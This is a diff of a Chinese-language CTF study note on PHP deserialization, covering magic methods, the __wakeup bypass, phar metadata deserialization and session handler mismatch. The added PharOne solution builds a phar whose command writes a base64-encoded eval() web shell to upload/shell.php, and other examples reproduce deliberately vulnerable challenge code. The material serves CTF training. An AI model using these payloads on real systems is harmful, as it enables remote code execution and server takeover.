@@ -1,10 +1,10 @@
-# PHP反序列化
+# PHP 反序列化
 
 序列化是将**数据结构**或**对象状态**转换为**可存储或传输的格式**的过程，以便在不同平台或环境中交换或保存，并在需要时恢复原始状态。
 
 反序列化是将序列化后的数据（如字符串，字节流等）**还原**为原始对象的过程。
 
-PHP提供了两个内置函数实现序列化和反序列化：
+PHP 提供了两个内置函数实现序列化和反序列化：
 
 - [serialize()](https://www.php.net/manual/zh/function.serialize.php)，序列化函数，生成值的可存储表示。可处理所有的类型，除了 resource 类型和一些 object（大多数是没有序列化接口的内置对象）
 
@@ -79,7 +79,7 @@ O:6:"Person":3:{s:8:"username";s:4:"john";s:6:"%00*%00age";i:20;s:12:"%00Person%
 
 ## 常见魔术方法
 
-魔术方法是一种特殊的方法，会在对象执行某些操作时覆盖PHP的默认操作，[了解更多](https://www.php.net/manual/zh/language.oop5.magic.php)
+魔术方法是一种特殊的方法，会在对象执行某些操作时覆盖 PHP 的默认操作，[了解更多](https://www.php.net/manual/zh/language.oop5.magic.php)
 
 ### 魔术方法名称及说明
 
@@ -166,17 +166,17 @@ __destruct
 */
 ```
 
-|  魔术方法名称   |   说明  |
-| --- | --- |
-|__sleep()|serialize() 时调用|
-|__wakeup()|unserialize() 时调用|
-|__toString()|用于一个对象被当成字符串时调用|
-|__invoke()|当尝试以调用函数的方式调用一个对象时|
-|__construct()|构造函数，每次创建新对象时先调用此方法|
-|__destruct()|析构函数，某个对象的所有引用都被删除或者当对象被显式销毁时执行|
-|__set()|在给不可访问（protected 或 private）或不存在的属性赋值时|
-|__get()|读取不可访问（protected 或 private）或不存在的属性的值时|
-|__call()|当对象调用一个不可访问方法时|
+| 魔术方法名称    | 说明                                                           |
+| --------------- | -------------------------------------------------------------- |
+| \_\_sleep()     | serialize() 时调用                                             |
+| \_\_wakeup()    | unserialize() 时调用                                           |
+| \_\_toString()  | 用于一个对象被当成字符串时调用                                 |
+| \_\_invoke()    | 当尝试以调用函数的方式调用一个对象时                           |
+| \_\_construct() | 构造函数，每次创建新对象时先调用此方法                         |
+| \_\_destruct()  | 析构函数，某个对象的所有引用都被删除或者当对象被显式销毁时执行 |
+| \_\_set()       | 在给不可访问（protected 或 private）或不存在的属性赋值时       |
+| \_\_get()       | 读取不可访问（protected 或 private）或不存在的属性的值时       |
+| \_\_call()      | 当对象调用一个不可访问方法时                                   |
 
 ### 例题分析
 
@@ -221,7 +221,6 @@ echo serialize($o);
 
 - BUUCTF - [NewStarCTF 2023 公开赛道]Unserialize?
 
-
 ## 常见绕过方法
 
 - `__wakeup()`方法绕过（[CVE-2016-7124](https://www.cve.org/CVERecord?id=CVE-2016-7124)）
@@ -241,7 +240,7 @@ PHP before 5.6.25 and 7.x before 7.0.10
 
 - BUUCTF - [NewStarCTF 2023 公开赛道]Unserialize Again
 
-## POP链构造
+## POP 链构造
 
 面向属性编程（Property-Oriented Programing）
 
@@ -251,11 +250,13 @@ PHP before 5.6.25 and 7.x before 7.0.10
 
 题目？？
 
-## Phar反序列化
+## Phar 反序列化
 
-`phar`扩展提供了一种将整个PHP应用程序放入单个叫做`phar`（PHP 归档）文件的方法，以便于分发和安装。phar 是 PHP 和 Archive 的合成词，大致上基于 Java 开发人员熟悉的 jar（Java 归档）。
+### phar 文件介绍
 
-phar文件由[4部分组成](https://www.php.net/manual/zh/phar.fileformat.phar.php)：
+`phar`扩展提供了一种将整个 PHP 应用程序放入单个叫做`phar`（PHP 归档）文件的方法，以便于分发和安装。phar 是 PHP 和 Archive 的合成词，大致上基于 Java 开发人员熟悉的 jar（Java 归档）。
+
+phar 文件由[4 部分组成](https://www.php.net/manual/zh/phar.fileformat.phar.php)：
 
 1. `stub`，标志，格式为`xxx<?php xxx; __HALT_COMPILER();?>`，前面内容不限，但必须以`__HALT_COMPILER();?>`结尾
 2. `manifest`，清单。其中还会经`serialize()`序列化保存`Meta-data`
@@ -270,156 +271,391 @@ include 'phar:///path/to/myphar.phar/file.php';
 ?>
 ```
 
-漏洞原理
+### 漏洞原理
 
-2018年，安全研究员`Sam Thomas`分享了议题[It’s a PHP unserialization vulnerability Jim, but not as we know it](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)，利用phar文件会以序列化的形式存储用户自定义的`meta-data`这一特性，拓展了php反序列化漏洞的攻击面。
-
-参考：<https://paper.seebug.org/680/>
+2018 年，安全研究员`Sam Thomas`分享了议题[It’s a PHP unserialization vulnerability Jim, but not as we know it](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)，利用 phar 文件会以序列化的形式存储用户自定义的`meta-data`这一特性，拓展了 PHP 反序列化漏洞的攻击面。
 
 题眼
 
-- 允许上传精心构造的phar文件
+- 允许上传精心构造的 phar 文件
 - 允许使用`phar://`
 
-添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件
+添加任意的文件头+修改后缀名的方式将 phar 文件伪装成其他格式的文件
 
-创建phar文件
+### 创建 phar 文件
 
-注意：`php.ini`中的`phar.readonly`选项设置为`Off`，否则无法生成phar文件。
+?> 需将`php.ini`中的`phar.readonly`选项设置为`Off`，否则无法生成 phar 文件。
 
 ```php
 <?php
-class AnyClass {}
+class AnyClass
+{
+    public function __destruct()
+    {
+        echo "__destruct" . PHP_EOL;
+    }
+}
 
 @unlink("test.phar"); // 删除已有文件
 $phar = new Phar("test.phar"); //文件名，后缀名必须为phar
 $phar->startBuffering();
-$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
+$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>"); //设置stub
 $object = new AnyClass();
 $phar->setMetadata($object); //将自定义的meta-data存入manifest
 $phar->addFromString("test.txt", "test"); //添加要压缩的文件
 //签名自动计算
 $phar->stopBuffering();
+
+// 本地测试
+if (file_exists("test.phar")) {
+    file_get_contents("phar://test.phar");
+}
+
 ```
 
-例题：D3CTF 2019 EzUpload   [GXYCTF2019]BabysqliV3.0
+在`meta-data`部分内容以序列化形式存储。
 
-<style>
-  .slidev-code {
-    height: 400px !important;
-  }
-</style>
+```bash
+$ xxd test.phar
+00000000: 3c3f 7068 7020 5f5f 4841 4c54 5f43 4f4d  <?php __HALT_COM
+00000010: 5049 4c45 5228 293b 203f 3e0d 0a49 0000  PILER(); ?>..I..
+00000020: 0001 0000 0011 0000 0001 0000 0000 0013  ................
+00000030: 0000 004f 3a38 3a22 416e 7943 6c61 7373  ...O:8:"AnyClass
+00000040: 223a 303a 7b7d 0800 0000 7465 7374 2e74  ":0:{}....test.t
+00000050: 7874 0400 0000 dbee 2a68 0400 0000 0c7e  xt......*h.....~
+00000060: 7fd8 b601 0000 0000 0000 7465 7374 8b7e  ..........test.~
+00000070: 036c b419 d175 41e8 8c81 e4bd 8cf3 4b6e  .l...uA.......Kn
+00000080: ca61 0200 0000 4742 4d42                 .a....GBMB
+```
+
+### 例题分析
+
+<!-- [GXYCTF2019]BabysqliV3.0 -->
+
+#### 例题1：[NewStarCTF 2023 公开赛道] PharOne
+
+首页为文件上传，查看网页源代码，提示`class.php`，直接访问得源代码如下：
 
 ```php
 <?php
-class dir {
- public $userdir;
- public $url;
- public $filename;
+highlight_file(__FILE__);
+class Flag
+{
+    public $cmd;
+    public function __destruct()
+    {
+        @exec($this->cmd);
+    }
+}
+@unlink($_POST['file']);
 
-  // 构造函数，为每个用户创建独立的目录
- public function __construct($url, $filename) {
-  $this->userdir = "upload/" . md5($_SERVER["REMOTE_ADDR"]);
-  $this->url = $url;
-  $this->filename = $filename;
-  if (!file_exists($this->userdir)) {
-   mkdir($this->userdir, 0777, true);
-  }
- }
+```
 
-  // 检查目录
- public function checkdir() {
-  if ($this->userdir != "upload/" . md5($_SERVER["REMOTE_ADDR"])) {
-   die('hacker!!!');
-  }
- }
+经典反序列化题目，但是没有`unserialize()`函数。上传`phar`文件，使用`unlink`函数触发`phar://`协议。
 
-  // 检查url，协议不能为空，也不能是file、php
- public function checkurl() {
-  $r = parse_url($this->url);
-  if (!isset($r['scheme']) || preg_match("/file|php/i", $r['scheme'])) {
-   die('hacker!!!');
-  }
- }
+```php
+<?php
+class Flag
+{
+    public $cmd = "echo PD9waHAgZXZhbCgkX1BPU1RbYV0pOz8+|base64 -d > upload/shell.php";
+}
 
-  // 检查文件名，不能包含..、/，后缀不能有ph
- public function checkext() {
-  if (stristr($this->filename, '..')) {
-   die('hacker!!!');
-  }
-  if (stristr($this->filename, '/')) {
-   die('hacker!!!');
-  }
-  $ext = substr($this->filename, strrpos($this->filename, ".") + 1);
-  if (preg_match("/ph/i", $ext)) {
-   die('hacker!!!');
-  }
- }
- public function upload() {
-  $this->checkdir();
-  $this->checkurl();
-  $this->checkext();
-  $content = file_get_contents($this->url, NULL, NULL, 0, 2048);
-  if (preg_match("/\<\?|value|on|type|flag|auto|set|\\\\/i", $content)) {
-   die('hacker!!!');
-  }
-  file_put_contents($this->userdir."/".$this->filename, $content);
- }
- public function remove() {
-  $this->checkdir();
-  $this->checkext();
-  if (file_exists($this->userdir."/".$this->filename)) {
-   unlink($this->userdir."/".$this->filename);
-  }
- }
- public function count($dir) {
-  if ($dir === '') {
-   $num = count(scandir($this->userdir)) - 2;
-  } else {
-   $num = count(scandir($dir)) - 2;
-  }
-  if ($num > 0) {
-   return "you have $num files";
-  } else {
-   return "you don't have file";
-  }
- }
- public function __toString() {
-  return implode(" ", scandir(__DIR__."/".$this->userdir));
- }
- public function __destruct() {
-  $string = "your file in : ".$this->userdir;
-  file_put_contents($this->filename.".txt", $string);
-  echo $string;
- }
+@unlink("test.phar"); // 删除已有文件
+$phar = new Phar("test.phar"); //文件名，后缀名必须为phar
+$phar->startBuffering();
+$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>"); //设置stub
+$object = new Flag();
+$phar->setMetadata($object); //将自定义的meta-data存入manifest
+$phar->addFromString("test.txt", "test"); //添加要压缩的文件
+//签名自动计算
+$phar->stopBuffering();
+
+```
+
+#### [SWPUCTF 2018]SimplePHP
+
+题目存在任意文件读取漏洞，获取题目源代码。
+
+- `file.php?file=function.php`
+
+```php
+<?php
+//show_source(__FILE__); 
+include "base.php";
+header("Content-type: text/html;charset=utf-8");
+error_reporting(0);
+function upload_file_do()
+{
+    global $_FILES;
+    $filename = md5($_FILES["file"]["name"] . $_SERVER["REMOTE_ADDR"]) . ".jpg";
+    //mkdir("upload",0777); 
+    if (file_exists("upload/" . $filename)) {
+        unlink($filename);
+    }
+    move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $filename);
+    echo '<script type="text/javascript">alert("上传成功!");</script>';
+}
+function upload_file()
+{
+    global $_FILES;
+    if (upload_file_check()) {
+        upload_file_do();
+    }
+}
+function upload_file_check()
+{
+    global $_FILES;
+    $allowed_types = array("gif", "jpeg", "jpg", "png");
+    $temp = explode(".", $_FILES["file"]["name"]);
+    $extension = end($temp);
+    if (empty($extension)) {
+        //echo "<h4>请选择上传的文件:" . "<h4/>"; 
+    } else {
+        if (in_array($extension, $allowed_types)) {
+            return true;
+        } else {
+            echo '<script type="text/javascript">alert("Invalid file!");</script>';
+            return false;
+        }
+    }
+}
+
+```
+
+- `file.php?file=file.php`
+
+```php
+<?php
+header("content-type:text/html;charset=utf-8");
+include 'function.php';
+include 'class.php';
+ini_set('open_basedir', '/var/www/html/');
+$file = $_GET["file"] ? $_GET['file'] : "";
+if (empty($file)) {
+    echo "<h2>There is no file to show!<h2/>";
+}
+$show = new Show();
+if (file_exists($file)) {
+    $show->source = $file;
+    $show->_show();
+} else if (!empty($file)) {
+    die('file doesn\'t exists.');
+}
+```
+
+- `file.php?file=class.php`
+
+```php
+<?php
+class C1e4r
+{
+    public $test;
+    public $str;
+    public function __construct($name)
+    {
+        $this->str = $name;
+    }
+    public function __destruct()
+    {
+        $this->test = $this->str;
+        echo $this->test;
+    }
+}
+
+class Show
+{
+    public $source;
+    public $str;
+    public function __construct($file)
+    {
+        $this->source = $file;   //$this->source = phar://phar.jpg
+        echo $this->source;
+    }
+    public function __toString()
+    {
+        $content = $this->str['str']->source;
+        return $content;
+    }
+    public function __set($key, $value)
+    {
+        $this->$key = $value;
+    }
+    public function _show()
+    {
+        if (preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i', $this->source)) {
+            die('hacker!');
+        } else {
+            highlight_file($this->source);
+        }
+    }
+    public function __wakeup()
+    {
+        if (preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
+            echo "hacker~";
+            $this->source = "index.php";
+        }
+    }
+}
+class Test
+{
+    public $file;
+    public $params;
+    public function __construct()
+    {
+        $this->params = array();
+    }
+    public function __get($key)
+    {
+        return $this->get($key);
+    }
+    public function get($key)
+    {
+        if (isset($this->params[$key])) {
+            $value = $this->params[$key];
+        } else {
+            $value = "index.php";
+        }
+        return $this->file_get($value);
+    }
+    public function file_get($value)
+    {
+        $text = base64_encode(file_get_contents($value));
+        return $text;
+    }
+}
+
+```
+
+### 练习题
+
+- [D3CTF 2019]EzUpload
+- [CISCN2019 华北赛区 Day1 Web1]Dropbox
+
+```php
+<?php
+class dir
+{
+    public $userdir;
+    public $url;
+    public $filename;
+
+    // 构造函数，为每个用户创建独立的目录
+    public function __construct($url, $filename)
+    {
+        $this->userdir = "upload/" . md5($_SERVER["REMOTE_ADDR"]);
+        $this->url = $url;
+        $this->filename = $filename;
+        if (!file_exists($this->userdir)) {
+            mkdir($this->userdir, 0777, true);
+        }
+    }
+
+    // 检查目录
+    public function checkdir()
+    {
+        if ($this->userdir != "upload/" . md5($_SERVER["REMOTE_ADDR"])) {
+            die('hacker!!!');
+        }
+    }
+
+    // 检查url，协议不能为空，也不能是file、php
+    public function checkurl()
+    {
+        $r = parse_url($this->url);
+        if (!isset($r['scheme']) || preg_match("/file|php/i", $r['scheme'])) {
+            die('hacker!!!');
+        }
+    }
+
+    // 检查文件名，不能包含..、/，后缀不能有ph
+    public function checkext()
+    {
+        if (stristr($this->filename, '..')) {
+            die('hacker!!!');
+        }
+        if (stristr($this->filename, '/')) {
+            die('hacker!!!');
+        }
+        $ext = substr($this->filename, strrpos($this->filename, ".") + 1);
+        if (preg_match("/ph/i", $ext)) {
+            die('hacker!!!');
+        }
+    }
+    public function upload()
+    {
+        $this->checkdir();
+        $this->checkurl();
+        $this->checkext();
+        $content = file_get_contents($this->url, NULL, NULL, 0, 2048);
+        if (preg_match("/\<\?|value|on|type|flag|auto|set|\\\\/i", $content)) {
+            die('hacker!!!');
+        }
+        file_put_contents($this->userdir . "/" . $this->filename, $content);
+    }
+    public function remove()
+    {
+        $this->checkdir();
+        $this->checkext();
+        if (file_exists($this->userdir . "/" . $this->filename)) {
+            unlink($this->userdir . "/" . $this->filename);
+        }
+    }
+    public function count($dir)
+    {
+        if ($dir === '') {
+            $num = count(scandir($this->userdir)) - 2;
+        } else {
+            $num = count(scandir($dir)) - 2;
+        }
+        if ($num > 0) {
+            return "you have $num files";
+        } else {
+            return "you don't have file";
+        }
+    }
+    public function __toString()
+    {
+        return implode(" ", scandir(__DIR__ . "/" . $this->userdir));
+    }
+    public function __destruct()
+    {
+        $string = "your file in : " . $this->userdir;
+        file_put_contents($this->filename . ".txt", $string);
+        echo $string;
+    }
 }
 
 if (!isset($_POST['action']) || !isset($_POST['url']) || !isset($_POST['filename'])) {
- highlight_file(__FILE__);
- die();
+    highlight_file(__FILE__);
+    die();
 }
 
 $dir = new dir($_POST['url'], $_POST['filename']);
 if ($_POST['action'] === "upload") {
- $dir->upload();
+    $dir->upload();
 } elseif ($_POST['action'] === "remove") {
- $dir->remove();
+    $dir->remove();
 } elseif ($_POST['action'] === "count") {
- if (!isset($_POST['dir'])) {
-  echo $dir->count('');
- } else {
-  echo $dir->count($_POST['dir']);
- }
+    if (!isset($_POST['dir'])) {
+        echo $dir->count('');
+    } else {
+        echo $dir->count($_POST['dir']);
+    }
 }
 ```
 
+### 参考资料
+
+- <https://paper.seebug.org/680/>
+- <https://www.anquanke.com/post/id/240007>
+
 ## session 反序列化
 
-`session`是一种“会话机制”，其数据存储于服务端，PHP提供`$_SEESION`超全局变量
+`session`是一种“会话机制”，其数据存储于服务端，PHP 提供`$_SEESION`超全局变量
 
-会话开始后，PHP将会话中的数据保存到 `$_SESSION` 数组。
+会话开始后，PHP 将会话中的数据保存到 `$_SESSION` 数组。
 
-当PHP运行结束后，将`$_SESSION`中的内容进行序列化后，通过会话保存管理器将序列化后的字符串保存到`session`文件中。
+当 PHP 运行结束后，将`$_SESSION`中的内容进行序列化后，通过会话保存管理器将序列化后的字符串保存到`session`文件中。
 
 ```php
 <?php
@@ -429,11 +665,11 @@ session_start();
 $_SESSION['username'] = 'Alice';
 ```
 
-|[常见配置选项](https://www.php.net/manual/en/session.configuration.php)|说明|
-|---|---|
-|session.save_handler|保存形式，默认为files|
-|session.save_path|保存路径，默认路径有`/tmp/`、`/var/lib/php/`|
-|session.serialize_handler|序列化处理器名称，有`php`、`php_binary`和`php_serialize`三种，默认为`php`|
+| [常见配置选项](https://www.php.net/manual/en/session.configuration.php) | 说明                                                                      |
+| ----------------------------------------------------------------------- | ------------------------------------------------------------------------- |
+| session.save_handler                                                    | 保存形式，默认为 files                                                    |
+| session.save_path                                                       | 保存路径，默认路径有`/tmp/`、`/var/lib/php/`                              |
+| session.serialize_handler                                               | 序列化处理器名称，有`php`、`php_binary`和`php_serialize`三种，默认为`php` |
 
 不同序列化处理器，序列化数据存储格式不同
 
@@ -449,11 +685,11 @@ $_SESSION['name'] = 'Alice';
 $_SESSION['age'] = 25;
 ```
 
-|处理器名称|数据存储格式|
-|---|---|
-|php|键名 + 竖线 + 经过 serialize() 函数序列化处理的值，如 name\|s:5:"Alice";age\|i:25;|
-|php_binary|键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值，如 \x04names:5:"Alice";\x03agei:25;|
-|php_serialize|$_SESSION数组经serialize()函数处理，如 a:2:{s:4:"name";s:5:"Alice";s:3:"age";i:25;}|
+| 处理器名称    | 数据存储格式                                                                                                 |
+| ------------- | ------------------------------------------------------------------------------------------------------------ |
+| php           | 键名 + 竖线 + 经过 serialize() 函数序列化处理的值，如 name\|s:5:"Alice";age\|i:25;                           |
+| php_binary    | 键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize()函数序列化处理的值，如 \x04names:5:"Alice";\x03agei:25; |
+| php_serialize | $\_SESSION 数组经 serialize()函数处理，如 a:2:{s:4:"name";s:5:"Alice";s:3:"age";i:25;}                       |
 
 ### 例题分析
 
@@ -471,8 +707,7 @@ $_SESSION['age'] = 25;
 - 可以控制`session`的内容
 - 脚本文件指定了处理器
 
-
-例题：Jarvis OJ — PHPINFO  分析
+例题：Jarvis OJ — PHPINFO 分析
 
 ```php
 <?php
@@ -486,7 +721,7 @@ class OowoO
     {
         $this->mdzz = 'phpinfo();';
     }
-    
+
     function __destruct()
     {
         eval($this->mdzz);
@@ -508,11 +743,10 @@ else
 1. 存在恶意类`OowoO`，析构方法中存在代码执行漏洞
 2. 通过 `phpinfo()` 可知：
 
-- *`session.upload_progress.enabled=On`*，可用文件上传在`session`中写入数据
-- *`session.serialize_handler`* 的默认值为`php_serialize`，脚本运行时配置为`php`，**处理器不一致**
+- _`session.upload_progress.enabled=On`_，可用文件上传在`session`中写入数据
+- _`session.serialize_handler`_ 的默认值为`php_serialize`，脚本运行时配置为`php`，**处理器不一致**
 
 3. 我们可通过文件上传控制`session`文件内容，进而实现`session`反序列化漏洞攻击
-
 
 <!--
 https://xz.aliyun.com/t/6640
@@ -542,12 +776,16 @@ echo serialize($obj);
 ```
 
 2. 构造文件上传进度请求
-  
+
 ```html
-<form action="http://web.jarvisoj.com:32784/" method="POST" enctype="multipart/form-data">
-    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
-    <input type="file" name="file" />
-    <input type="submit" />
+<form
+  action="http://web.jarvisoj.com:32784/"
+  method="POST"
+  enctype="multipart/form-data"
+>
+  <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
+  <input type="file" name="file" />
+  <input type="submit" />
 </form>
 ```
 
@@ -556,9 +794,10 @@ echo serialize($obj);
 <!--
 https://medium.com/@lyltvip/php-deserialization-escape-970cd8ea714e
 -->
-## PHP原生类
 
-PHP内置类
+## PHP 原生类
+
+PHP 内置类
 
 读取目录、文件
 
@@ -566,7 +805,7 @@ PHP内置类
 - [Filesystemlterator](https://www.php.net/manual/zh/class.filesystemiterator.php) - 以绝路路径的形式列出的文件信息
 - [Globlterator](https://www.php.net/manual/zh/class.globiterator.php) - 遍历一个文件目录，可以通过模式匹配来寻找文件路径
 
-- [SplFileInfo](https://www.php.net/manual/en/class.splfileinfo.php) - SplFileInfo类为单个文件的信息提供了高级的面向对象接口
+- [SplFileInfo](https://www.php.net/manual/en/class.splfileinfo.php) - SplFileInfo 类为单个文件的信息提供了高级的面向对象接口
 
 ## 练习题
 
@@ -576,12 +815,11 @@ PHP内置类
 - POP
   - ISCC_2022_POP2022
   - 强网杯_2021_赌徒
-  - 网鼎杯_2020_青龙组AreUSerialz
+  - 网鼎杯_2020_青龙组 AreUSerialz
   - ISCC_2022_findme
   - GYCTF2020 Easyphp
 - 字符逃逸
-  - 强网杯_2020_Web辅助
-
+  - 强网杯\_2020_Web 辅助
 
 ### 极客大挑战 2019 php
 
@@ -590,8 +828,8 @@ PHP内置类
 
 ```php
 class Name {
-	private $username = 'admin';
-	private $password = 100;
+ private $username = 'admin';
+ private $password = 100;
 }
 
 $o = new Name;
@@ -604,4 +842,5 @@ O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin
 ```
 
 ### buuctf - 2020-网鼎杯朱雀组-phpweb
+
 ### ISCC_2022_POP2022
